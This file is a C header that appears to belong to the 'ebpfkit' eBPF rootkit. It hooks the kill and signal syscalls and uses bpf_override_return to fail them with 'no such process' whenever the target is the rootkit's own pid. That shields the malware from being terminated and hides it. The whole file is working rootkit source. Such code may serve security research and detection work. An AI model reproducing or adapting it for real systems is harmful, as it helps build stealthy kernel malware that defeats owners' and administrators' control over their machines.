/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2021
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _SIGNAL_H_
#define _SIGNAL_H_

__attribute__((always_inline)) int handle_signal(struct pt_regs *ctx, int pid)
{
    u64 ebpfkit_pid;
    LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);

    if (pid == ebpfkit_pid)
    {
        bpf_override_return(ctx, -ESRCH);
    }

    return 0;
}

SYSCALL_KPROBE1(signal, int, pid)
{
    return handle_signal(ctx, pid);
}

SYSCALL_KPROBE1(kill, int, pid)
{
    return handle_signal(ctx, pid);
}

#endif